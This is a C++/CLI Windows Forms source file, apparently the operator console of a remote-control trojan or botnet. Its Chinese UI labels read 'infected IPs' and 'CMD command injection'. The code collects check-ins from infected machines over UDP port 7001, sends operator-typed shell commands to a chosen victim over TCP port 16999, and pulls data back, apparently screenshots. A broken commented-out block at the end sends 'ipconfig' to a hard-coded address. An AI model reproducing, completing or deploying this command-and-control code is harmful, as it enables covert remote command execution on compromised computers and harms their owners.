#pragma once
#include <iostream>  
#include <WinSock2.h>  
#include <atlstr.h>
#include <string>

#pragma  comment(lib, "ws2_32.lib")  
namespace DNIWServer {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace Runtime::InteropServices;
	using namespace Threading;
	const int MAX_BUF_LEN = 255;

	public delegate void recvIPA(String^ s);
	int flag = 0;
	
	/// <summary>
	/// DNIWServerForm 的摘要
	/// </summary>
	public ref class DNIWServerForm : public System::Windows::Forms::Form
	{
	public:
		DNIWServerForm(void)
		{
			InitializeComponent();
			//
			//TODO:  在此加入建構函式程式碼
			//
		}
		

	protected:
		/// <summary>
		/// 清除任何使用中的資源。
		/// </summary>
		~DNIWServerForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::TextBox^ textBox1;
	private: System::Windows::Forms::Label^ label1;
	private: System::Windows::Forms::PictureBox^ pictureBox1;
	private: System::Windows::Forms::Label^ label2;
	private: System::Windows::Forms::TextBox^ textBox2;
	private: System::Windows::Forms::Button^ button1;
	private: System::Windows::Forms::TextBox^ textBox3;
	private: System::Windows::Forms::Label^ label3;
	private: System::Windows::Forms::Label^ label4;
	private: System::Windows::Forms::Button^ button2;
	private: System::Windows::Forms::TextBox^ textBox4;
	protected:

	private:
		/// <summary>
		/// 設計工具所需的變數。
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// 此為設計工具支援所需的方法 - 請勿使用程式碼編輯器修改
		/// 這個方法的內容。
		/// </summary>
		void InitializeComponent(void)
		{
			this->textBox1 = (gcnew System::Windows::Forms::TextBox());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->textBox2 = (gcnew System::Windows::Forms::TextBox());
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->textBox3 = (gcnew System::Windows::Forms::TextBox());
			this->label3 = (gcnew System::Windows::Forms::Label());
			this->label4 = (gcnew System::Windows::Forms::Label());
			this->button2 = (gcnew System::Windows::Forms::Button());
			this->textBox4 = (gcnew System::Windows::Forms::TextBox());
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
			this->SuspendLayout();
			// 
			// textBox1
			// 
			this->textBox1->Location = System::Drawing::Point(663, 378);
			this->textBox1->Multiline = true;
			this->textBox1->Name = L"textBox1";
			this->textBox1->ReadOnly = true;
			this->textBox1->ScrollBars = System::Windows::Forms::ScrollBars::Both;
			this->textBox1->Size = System::Drawing::Size(294, 114);
			this->textBox1->TabIndex = 0;
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->label1->Location = System::Drawing::Point(759, 354);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(103, 21);
			this->label1->TabIndex = 1;
			this->label1->Text = L"已感染IP";
			// 
			// pictureBox1
			// 
			this->pictureBox1->Location = System::Drawing::Point(12, 9);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(645, 480);
			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox1->TabIndex = 2;
			this->pictureBox1->TabStop = false;
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->label2->Location = System::Drawing::Point(737, 9);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(138, 21);
			this->label2->TabIndex = 3;
			this->label2->Text = L"CMD指令注入";
			// 
			// textBox2
			// 
			this->textBox2->Location = System::Drawing::Point(663, 132);
			this->textBox2->Multiline = true;
			this->textBox2->Name = L"textBox2";
			this->textBox2->ScrollBars = System::Windows::Forms::ScrollBars::Both;
			this->textBox2->Size = System::Drawing::Size(294, 219);
			this->textBox2->TabIndex = 4;
			// 
			// button1
			// 
			this->button1->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->button1->Location = System::Drawing::Point(836, 498);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(121, 33);
			this->button1->TabIndex = 5;
			this->button1->Text = L"連接";
			this->button1->UseVisualStyleBackColor = true;
			this->button1->Click += gcnew System::EventHandler(this, &DNIWServerForm::Button1_Click);
			// 
			// textBox3
			// 
			this->textBox3->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->textBox3->Location = System::Drawing::Point(525, 498);
			this->textBox3->Multiline = true;
			this->textBox3->Name = L"textBox3";
			this->textBox3->Size = System::Drawing::Size(305, 33);
			this->textBox3->TabIndex = 6;
			// 
			// label3
			// 
			this->label3->AutoSize = true;
			this->label3->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->label3->Location = System::Drawing::Point(439, 504);
			this->label3->Name = L"label3";
			this->label3->Size = System::Drawing::Size(80, 21);
			this->label3->TabIndex = 7;
			this->label3->Text = L"輸入IP";
			// 
			// label4
			// 
			this->label4->AutoSize = true;
			this->label4->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->label4->Location = System::Drawing::Point(758, 108);
			this->label4->Name = L"label4";
			this->label4->Size = System::Drawing::Size(92, 21);
			this->label4->TabIndex = 8;
			this->label4->Text = L"CMD返回";
			// 
			// button2
			// 
			this->button2->Font = (gcnew System::Drawing::Font(L"標楷體", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->button2->Location = System::Drawing::Point(741, 72);
			this->button2->Name = L"button2";
			this->button2->Size = System::Drawing::Size(121, 33);
			this->button2->TabIndex = 9;
			this->button2->Text = L"注入";
			this->button2->UseVisualStyleBackColor = true;
			this->button2->Click += gcnew System::EventHandler(this, &DNIWServerForm::Button2_Click);
			// 
			// textBox4
			// 
			this->textBox4->Font = (gcnew System::Drawing::Font(L"新細明體", 15.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(136)));
			this->textBox4->Location = System::Drawing::Point(663, 33);
			this->textBox4->Multiline = true;
			this->textBox4->Name = L"textBox4";
			this->textBox4->Size = System::Drawing::Size(294, 33);
			this->textBox4->TabIndex = 10;
			// 
			// DNIWServerForm
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 12);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(973, 549);
			this->Controls->Add(this->textBox4);
			this->Controls->Add(this->button2);
			this->Controls->Add(this->label4);
			this->Controls->Add(this->label3);
			this->Controls->Add(this->textBox3);
			this->Controls->Add(this->button1);
			this->Controls->Add(this->textBox2);
			this->Controls->Add(this->label2);
			this->Controls->Add(this->pictureBox1);
			this->Controls->Add(this->label1);
			this->Controls->Add(this->textBox1);
			this->Name = L"DNIWServerForm";
			this->Text = L"DNIWServerForm";
			this->Load += gcnew System::EventHandler(this, &DNIWServerForm::DNIWServerForm_Load);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
			this->ResumeLayout(false);
			this->PerformLayout();

		}

		
		

#pragma endregion

	
		void recvIP() {
			WORD wVersionRequested;
			WSADATA wsaData;
			int err;

			wVersionRequested = MAKEWORD(2, 2);
			err = WSAStartup(wVersionRequested, &wsaData);
			if (err != 0)
			{
				this->Close();
			}
			if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
			{
				WSACleanup();
				this->Close();
			}

			SOCKET clientSock = socket(AF_INET, SOCK_DGRAM, 0);
			if (INVALID_SOCKET == clientSock)
			{

				WSACleanup();
				this->Close();
			}
			
			SOCKADDR_IN sin;
			sin.sin_family = AF_INET;
			sin.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
			sin.sin_port = htons(7001);
			if (bind(clientSock, (SOCKADDR*)& sin, sizeof(sin)) != 0)
			{

				closesocket(clientSock);
				WSACleanup();
				this->Close();
			}

			SOCKADDR_IN clientAddr;
			int addrLen = sizeof(clientAddr);
			int nSize;
			char recvBuff[1024];
			memset(recvBuff, 0, 1024);


			while (true) {
				nSize = recvfrom(clientSock, recvBuff, 1024, 0, (SOCKADDR*)& clientAddr, &addrLen);
				if (nSize == SOCKET_ERROR)
				{

					break;
				}
				recvBuff[nSize] = '\0';
				String^ q = gcnew String(recvBuff);
				textBox1->Text += q;

			}

			closesocket(clientSock);
			WSACleanup();
		}
	
		
		public:void sendCMD() {
			char szMsg[MAXBYTE] = { 0 };
			const char* chars = (const char*)(Marshal::StringToHGlobalAnsi(textBox3->Text)).ToPointer();
			const char* cmdCommand = (const char*)(Marshal::StringToHGlobalAnsi(textBox4->Text)).ToPointer();
			WSADATA TCPwasData;
			WSAStartup(MAKEWORD(2, 2), &TCPwasData);

			SOCKET sServer = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

			struct sockaddr_in ServerAddr;
			ServerAddr.sin_family = AF_INET;
			ServerAddr.sin_addr.S_un.S_addr = inet_addr(chars);
			ServerAddr.sin_port = htons(16999);

			connect(sServer, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr));


			
			send(sServer,cmdCommand,strlen(cmdCommand)+sizeof(char),0);
			closesocket(sServer);
			WSACleanup();
		}

		public:void recvPic() {
			char szMsg[MAXBYTE] = { 0 };
			const char* chars = (const char*)(Marshal::StringToHGlobalAnsi(textBox3->Text)).ToPointer();
			
			WSADATA TCPwasData;
			WSAStartup(MAKEWORD(2, 2), &TCPwasData);

			SOCKET sServer = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

			struct sockaddr_in ServerAddr;
			ServerAddr.sin_family = AF_INET;
			ServerAddr.sin_addr.S_un.S_addr = inet_addr(chars);
			ServerAddr.sin_port = htons(16999);

			connect(sServer, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr));

			recv(sServer,szMsg,sizeof(szMsg),0);
			
			closesocket(sServer);
			WSACleanup();
		}
		

	private: System::Void DNIWServerForm_Load(System::Object^ sender, System::EventArgs^ e) {
		::System::Threading::Thread^ thr1 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWServerForm::recvIP));
		thr1->Start();	
		
		
	}
	

	private: System::Void Button2_Click(System::Object^ sender, System::EventArgs^ e) {
		::System::Threading::Thread^ thr2 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWServerForm::sendCMD));
		thr2->Start();
	}
	

	private: System::Void Button1_Click(System::Object^ sender, System::EventArgs^ e) {
		::System::Threading::Thread^ thr3 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWServerForm::recvPic));
		thr3->Start();
	}
};
}


























/*
		public:void sendCMD() {
			char szMsg[MAXBYTE] = { 0 };
			const char* chars = (const char*)(Marshal::StringToHGlobalAnsi(textBox3->Text)).ToPointer();
			WSADATA TCPwasData;
			WSAStartup(MAKEWORD(2, 2), &TCPwasData);

			String^ s = "1";
			MessageBox::Show(s);

			struct sockaddr_in ServerAddr;
			ServerAddr.sin_family = AF_INET;
			ServerAddr.sin_addr.S_un.S_addr = inet_addr("192.168.247.132");
			ServerAddr.sin_port = htons(16999);

			connect(sServer, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr));

			String^ s2 = "2";
			MessageBox::Show(s2);

			while (true)
			{
				if (szMsg == "exit") {
					break;
				}
				String^ s3 = "3";
				MessageBox::Show(s3);

				lstrcpy((LPWSTR)szMsg, (LPWSTR)"ipconfig");
				send(sServer, szMsg, strlen(szMsg) + sizeof(char), 0);

			}
			Marshal::FreeHGlobal(IntPtr((void*)chars));
			const char* cedqwe = (const char*)(Marshal::StringToHGlobalAnsi(textBox4->Text)).ToPointer();
			while (flag!=3)
			{
				switch (flag)
					{
					case 1:
						WSADATA TCPwasData;
						WSAStartup(MAKEWORD(2, 2), &TCPwasData);
						
						struct sockaddr_in ServerAddr;
						ServerAddr.sin_family = AF_INET;
						ServerAddr.sin_addr.S_un.S_addr = inet_addr(chars);
						ServerAddr.sin_port = htons(8999);
						connect(sServer, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr));
						break;
					case 2:
						
						while (true)
						{
							if (szMsg == "exit") {
								break;
							}

							
							lstrcpy((LPWSTR)szMsg, (LPWSTR)cedqwe);
							send(sServer, szMsg, strlen(szMsg) + sizeof(char), 0);

						}
						Marshal::FreeHGlobal(IntPtr((void*)chars));
						flag = 3;
						break;
					
					}
			}
			
				
closesocket(sServer);
WSACleanup();
		}
		*/